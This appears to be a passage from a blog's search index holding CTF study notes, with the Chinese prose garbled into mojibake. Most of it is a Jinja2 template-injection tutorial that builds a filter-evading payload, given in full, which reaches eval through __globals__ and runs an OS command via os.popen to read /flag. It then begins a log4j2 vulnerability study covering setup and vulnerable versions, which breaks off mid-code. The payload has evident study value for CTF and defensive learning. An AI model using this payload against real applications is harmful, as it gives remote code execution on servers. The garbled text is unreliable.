jinja2.exceptions.UndefinedError: &#x27;foo&#x27; is undefined </span></span><br></pre></td></tr></table></figure></div><p>å¯¹äºè·å–æ•°å­—ï¼Œé™¤äº†ä¸Šé¢å‡ºç°çš„é‚£å‡ ç§å¤–æˆ‘ä»¬è¿˜å¯ä»¥æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> num = (<span class="variable language_">self</span>|<span class="built_in">int</span>) %&#125;&#123;&#123;num&#125;&#125;    <span class="comment"># 0, é€šè¿‡intè¿‡æ»¤å™¨è·å–æ•°å­—</span></span><br><span class="line">&#123;% <span class="built_in">set</span> num = (<span class="variable language_">self</span>|string|length) %&#125;&#123;&#123;num&#125;&#125;    <span class="comment"># 24, é€šè¿‡lengthè¿‡æ»¤å™¨è·å–æ•°å­—</span></span><br></pre></td></tr></table></figure></div><h3 id="è·å–ç‰¹å®šå­—ç¬¦"><a href="#è·å–ç‰¹å®šå­—ç¬¦" class="headerlink" title="è·å–ç‰¹å®šå­—ç¬¦"></a>è·å–ç‰¹å®šå­—ç¬¦</h3><p>è·å–.</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> point = <span class="variable language_">self</span>|<span class="built_in">float</span>|string|<span class="built_in">min</span> %&#125;    <span class="comment"># é€šè¿‡floatè¿‡æ»¤å™¨è·å–ç‚¹ .</span></span><br></pre></td></tr></table></figure></div><p>ä¸‹åˆ’çº¿</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)|string) %&#125;&#123;&#123;xhx&#125;&#125;  </span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=&#123; &#125;|select|string %&#125;&#123;&#123;xhx[<span class="number">24</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></div><p>ç©ºæ ¼</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> space = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">10</span>)|string) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space = &#123; &#125;|select|string %&#125;&#123;&#123;space[<span class="number">10</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></div><p>å·¦æ‹¬å·(                </p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> yin = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">195</span>)|string) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> yin = app.__doc__|string %&#125;&#123;&#123;yin[<span class="number">195</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></div><p>å³æ‹¬å·)</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> yin = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">199</span>)|string) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> yin = app.__doc__|string %&#125;&#123;&#123;yin[<span class="number">199</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></div><p>å•å¼•å·â€™</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> yin = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">181</span>)|string) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> yin = app.__doc__|string %&#125;&#123;&#123;yin[<span class="number">181</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></div><h3 id="cçš„åˆ©ç”¨"><a href="#cçš„åˆ©ç”¨" class="headerlink" title="%cçš„åˆ©ç”¨"></a>%cçš„åˆ©ç”¨</h3><p>å¸¸è§æ•°å­—</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> zero = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">38</span>)|<span class="built_in">int</span>) %&#125;    <span class="comment"># 0</span></span><br><span class="line">&#123;% <span class="built_in">set</span> one = (zero**zero)|<span class="built_in">int</span> %&#125;    <span class="comment"># 1</span></span><br><span class="line">&#123;% <span class="built_in">set</span> two = (zero-one-one)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 2</span></span><br><span class="line">&#123;% <span class="built_in">set</span> four = (two*two)|<span class="built_in">int</span> %&#125;    <span class="comment"># 4</span></span><br><span class="line">&#123;% <span class="built_in">set</span> five = (two*two*two)-one-one-one %&#125;    <span class="comment"># 5</span></span><br><span class="line">&#123;% <span class="built_in">set</span> seven = (zero-one-one-five)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 7</span></span><br></pre></td></tr></table></figure></div><p>å­—ç¬¦c</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> c = <span class="built_in">dict</span>(c=aa)|reverse|first %&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p><strong>dict()</strong> å‡½æ•°ç”¨äºåˆ›å»ºä¸€ä¸ªå­—å…¸,è¿™é‡Œdict(c&#x3D;aa)æ˜¯ {â€˜câ€™: Undefined}</p></blockquote><p>ç™¾åˆ†å·</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> bfh = <span class="variable language_">self</span>|string|urlencode|first %&#125; </span><br></pre></td></tr></table></figure></div><p>%c </p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> bfhc=bfh~c %&#125; </span><br></pre></td></tr></table></figure></div><blockquote><p>è¿™é‡Œæ„é€ äº†%c, ä¹‹åå¯ä»¥åˆ©ç”¨è¿™ä¸ª%cæ„é€ ä»»æ„å­—ç¬¦ã€‚~ç”¨äºå­—ç¬¦è¿æ¥</p></blockquote><p>ä½¿ç”¨%cæ„é€ æ–œæ  &#x2F;</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> slas = bfhc%((four~seven)|<span class="built_in">int</span>) %&#125; </span><br></pre></td></tr></table></figure></div><h3 id="å¸¸è§å­—æ®µ"><a href="#å¸¸è§å­—æ®µ" class="headerlink" title="å¸¸è§å­—æ®µ"></a>å¸¸è§å­—æ®µ</h3><p>builtins</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> but = <span class="built_in">dict</span>(buil=aa,tins=dd)|join %&#125;  </span><br></pre></td></tr></table></figure></div><p>import</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> imp = <span class="built_in">dict</span>(imp=aa,ort=dd)|join %&#125; </span><br></pre></td></tr></table></figure></div><p>popen</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> pon = <span class="built_in">dict</span>(po=aa,pen=dd)|join %&#125; </span><br></pre></td></tr></table></figure></div><p>os</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> os = <span class="built_in">dict</span>(o=aa,s=dd)|join %&#125; </span><br></pre></td></tr></table></figure></div><p>cat</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> ca = <span class="built_in">dict</span>(ca=aa,t=dd)|join %&#125;</span><br></pre></td></tr></table></figure></div><p>flag</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> flg = <span class="built_in">dict</span>(fl=aa,ag=dd)|join %&#125;</span><br></pre></td></tr></table></figure></div><p>eval</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> ev = <span class="built_in">dict</span>(ev=aa,al=dd)|join %&#125; </span><br></pre></td></tr></table></figure></div><p>read</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> red = <span class="built_in">dict</span>(re=aa,ad=dd)|join %&#125;  </span><br></pre></td></tr></table></figure></div><p><code>__builtins__</code></p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> bul = xhx*<span class="number">2</span>~but~xhx*<span class="number">2</span> %&#125;</span><br></pre></td></tr></table></figure></div><p>å°†ä¸Šé¢æ„é€ çš„å­—ç¬¦æˆ–å­—ç¬¦ä¸²æ‹¼æ¥èµ·æ¥æ„é€ å‡º <code>__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code>ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> pld = xhx*<span class="number">2</span>~imp~xhx*<span class="number">2</span>~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><br></pre></td></tr></table></figure></div><p>pldæ”¾å…¥SSTIä¸‡èƒ½payload</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> f,v <span class="keyword">in</span> whoami.__init__.__globals__.items() %&#125;    <span class="comment"># globals</span></span><br><span class="line">    &#123;% <span class="keyword">if</span> f == bul %&#125; </span><br><span class="line">        &#123;% <span class="keyword">for</span> a,b <span class="keyword">in</span> v.items() %&#125;    <span class="comment"># builtins</span></span><br><span class="line">            &#123;% <span class="keyword">if</span> a == ev %&#125;    <span class="comment"># eval</span></span><br><span class="line">                &#123;&#123;b(pld)&#125;&#125;    <span class="comment"># eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)</span></span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div><p>è¿‡æ»¤.çš„ç‰ˆæœ¬</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> f,v <span class="keyword">in</span> (<span class="variable language_">self</span>|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> f == bul %&#125;</span><br><span class="line">        &#123;% <span class="keyword">for</span> a,b <span class="keyword">in</span> (v|attr(itm))() %&#125;</span><br><span class="line">            &#123;% <span class="keyword">if</span> a == ev %&#125;</span><br><span class="line">            &#123;%<span class="built_in">print</span>(b(pld))%&#125;</span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div><h3 id="å®Œæ•´payload"><a href="#å®Œæ•´payload" class="headerlink" title="å®Œæ•´payload"></a>å®Œæ•´payload</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> zero = (<span class="variable language_">self</span>|<span class="built_in">int</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> one = (zero**zero)|<span class="built_in">int</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> two = (zero-one-one)|<span class="built_in">abs</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> four = (two*two)|<span class="built_in">int</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> five = (two*two*two)-one-one-one %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> three = five-one-one %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> nine = (two*two*two*two-five-one-one) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> seven = (zero-one-one-five)|<span class="built_in">abs</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space = <span class="variable language_">self</span>|string|<span class="built_in">min</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> point = <span class="variable language_">self</span>|<span class="built_in">float</span>|string|<span class="built_in">min</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> c = <span class="built_in">dict</span>(c=aa)|reverse|first %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bfh = <span class="variable language_">self</span>|string|urlencode|first %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bfhc = bfh~c %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> slas = bfhc%((four~seven)|<span class="built_in">int</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> yin = bfhc%((three~nine)|<span class="built_in">int</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx = bfhc%((nine~five)|<span class="built_in">int</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> right = bfhc%((four~one)|<span class="built_in">int</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> left = bfhc%((four~zero)|<span class="built_in">int</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> but = <span class="built_in">dict</span>(buil=aa,tins=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> imp = <span class="built_in">dict</span>(imp=aa,ort=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pon = <span class="built_in">dict</span>(po=aa,pen=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> so = <span class="built_in">dict</span>(o=aa,s=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ca = <span class="built_in">dict</span>(ca=aa,t=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> flg = <span class="built_in">dict</span>(fl=aa,ag=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ev = <span class="built_in">dict</span>(ev=aa,al=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> red = <span class="built_in">dict</span>(re=aa,ad=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> sl = <span class="built_in">dict</span>(l=aa,s=dd)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bul = xhx~xhx~but~xhx~xhx %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini = <span class="built_in">dict</span>(ini=aa,t=bb)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo = <span class="built_in">dict</span>(glo=aa,bals=bb)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> itm = <span class="built_in">dict</span>(ite=aa,ms=bb)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> f,v <span class="keyword">in</span> (<span class="variable language_">self</span>|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> f == bul %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> a,b <span class="keyword">in</span> (v|attr(itm))() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> a == ev %&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(b(pld))%&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ssti </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2æ¼æ´å­¦ä¹ </title>
      <link href="/2022/12/27/log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/12/27/log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="log4j2æ¼æ´å­¦ä¹ "><a href="#log4j2æ¼æ´å­¦ä¹ " class="headerlink" title="log4j2æ¼æ´å­¦ä¹ "></a>log4j2æ¼æ´å­¦ä¹ </h1><h2 id="log4jä¸log4j2åŒºåˆ«"><a href="#log4jä¸log4j2åŒºåˆ«" class="headerlink" title="log4jä¸log4j2åŒºåˆ«"></a>log4jä¸log4j2åŒºåˆ«</h2><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p>log4jç”¨.propertiesçš„æ–‡ä»¶ä½œä¸ºä¸»é…ç½®æ–‡ä»¶çš„ï¼Œè€Œç°åœ¨çš„log4j 2åˆ™å·²ç»å¼ƒç”¨äº†è¿™ç§æ–¹å¼ï¼Œé‡‡ç”¨çš„æ˜¯.xmlï¼Œ.jsonæˆ–è€….jsnè¿™ç§æ–¹å¼æ¥åš</p><h3 id="æ ¸å¿ƒjaråŒ…"><a href="#æ ¸å¿ƒjaråŒ…" class="headerlink" title="æ ¸å¿ƒjaråŒ…"></a>æ ¸å¿ƒjaråŒ…</h3><p>log4jåªéœ€è¦å¼•å…¥ä¸€ä¸ªjaråŒ…å³å¯ï¼Œ</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>è€Œlog4j 2åˆ™æ˜¯éœ€è¦2ä¸ªæ ¸å¿ƒ</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>log4jå’Œlog4j 2çš„åŒ…è·¯å¾„æ˜¯ä¸åŒçš„,ç”šè‡³å¯ä»¥åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­ä½¿ç”¨2ä¸ªç‰ˆæœ¬çš„æ—¥å¿—è¾“å‡º</p></blockquote><h3 id="æ–‡ä»¶æ¸²æŸ“"><a href="#æ–‡ä»¶æ¸²æŸ“" class="headerlink" title="æ–‡ä»¶æ¸²æŸ“"></a>æ–‡ä»¶æ¸²æŸ“</h3><p>log4jæƒ³è¦ç”Ÿæ•ˆï¼Œæˆ‘ä»¬éœ€è¦åœ¨web.xmlä¸­è¿›è¡Œé…ç½®</p><p>log4j2å°±æ¯”è¾ƒç®€å•ï¼Œä»¥mavenå·¥ç¨‹ä¸ºä¾‹ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠlog4j2.xmlæ”¾åˆ°å·¥ç¨‹resourceç›®å½•ä¸‹å°±è¡Œäº†ã€‚å¤§å®¶è®°ä½ä¸€ä¸ªç»†èŠ‚ç‚¹ï¼Œæ˜¯log4j2.xmlï¼Œè€Œä¸æ˜¯log4j.xmlï¼Œ<u>xmlåå­—å°‘ä¸ª2éƒ½ä¸è¡Œ</u></p><h3 id="logè°ƒç”¨"><a href="#logè°ƒç”¨" class="headerlink" title="logè°ƒç”¨"></a>logè°ƒç”¨</h3><p>log4j</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.log4j.Logger;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> Logger.getLogger(Test.class.getName());</span><br></pre></td></tr></table></figure></div><p>log4j2</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Level;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Test.class.getName());</span><br></pre></td></tr></table></figure></div><h2 id="è¸©å‘è®°å½•"><a href="#è¸©å‘è®°å½•" class="headerlink" title="è¸©å‘è®°å½•"></a>è¸©å‘è®°å½•</h2><p>å¦‚æœlog4j.propertiesä¸€ç›´ä¸èµ·ä½œç”¨ï¼Œå°†å…¶å¤åˆ¶åˆ°targetçš„classesxia</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6qwvy8e0hj30r8056glt.jpg"                      alt="image-20221002140908570"                ><figcaption>image-20221002140908570</figcaption></figure></p><h3 id="ä¸€äº›é…ç½®æ•™è®­"><a href="#ä¸€äº›é…ç½®æ•™è®­" class="headerlink" title="ä¸€äº›é…ç½®æ•™è®­"></a>ä¸€äº›é…ç½®æ•™è®­</h3><p>æ³¨æ„ç‰ˆæœ¬å¯¹åº”</p><p>å¦‚æœæ˜¯2021.3çš„ideaï¼Œä¸è¦ä½¿ç”¨é«˜ç‰ˆæœ¬mavenï¼Œåº”ä½¿ç”¨3.5.4</p><h3 id="å¼•å…¥ä¾èµ–"><a href="#å¼•å…¥ä¾èµ–" class="headerlink" title="å¼•å…¥ä¾èµ–"></a>å¼•å…¥ä¾èµ–</h3><p>ç¬¬ä¸€æ¬¡å¼•å…¥ä¼šå› ä¸ºæ²¡æœ‰ä¸‹è½½è€Œçˆ†çº¢ï¼Œç‚¹å‡»åˆ·æ–°å³å¯</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232951.jpg"                      alt="image-20221002141921173"                ><figcaption>image-20221002141921173</figcaption></figure></p><h3 id="å¯¼åŒ…æ³¨æ„åç§°"><a href="#å¯¼åŒ…æ³¨æ„åç§°" class="headerlink" title="å¯¼åŒ…æ³¨æ„åç§°"></a>å¯¼åŒ…æ³¨æ„åç§°</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br></pre></td></tr></table></figure></div><blockquote><p>2.14.0 log4jå¯¼åŒ…</p></blockquote><h3 id="ç¨‹åºåŒ…-com-sun-jndi-rmi-registry-ä¸å¯è§"><a href="#ç¨‹åºåŒ…-com-sun-jndi-rmi-registry-ä¸å¯è§" class="headerlink" title="ç¨‹åºåŒ… com.sun.jndi.rmi.registry ä¸å¯è§"></a>ç¨‹åºåŒ… com.sun.jndi.rmi.registry ä¸å¯è§</h3><p>æ³¨æ„ï¼šè¿˜æ˜¯å¾—æ¢æˆjdk1.8</p><p>è§£å†³ï¼Œåœ¨pom.xmlä¸­åŠ å…¥ä»¥ä¸‹æ ‡ç­¾</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span 